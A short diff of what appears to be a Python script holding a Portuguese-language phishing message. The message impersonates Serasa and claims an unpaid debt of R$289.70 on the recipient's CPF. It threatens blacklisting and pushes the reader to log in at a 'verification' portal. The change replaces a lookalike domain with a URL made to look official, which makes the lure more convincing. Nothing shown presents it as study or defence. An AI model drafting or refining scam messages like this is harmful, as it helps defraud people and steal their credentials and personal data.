@@ -5,7 +5,7 @@ PORT = 1234
 
 mensagem = ("Prezado(a) cliente, identificamos uma pendência financeira em seu CPF no valor de R$289,70.\n\n"
             "Para evitar negativação do nome, acesse imediatamente o portal abaixo e realize a verificação dos dados:\n"
-            "consulta-serasa.com:8080\n\n"
+            "https://serasa.com.br/entrar.php\n\n"
             "Após o login, você poderá gerar o boleto de quitação ou parcelar sua dívida.\n\n"
             "Atendimento automático 24h.")
 
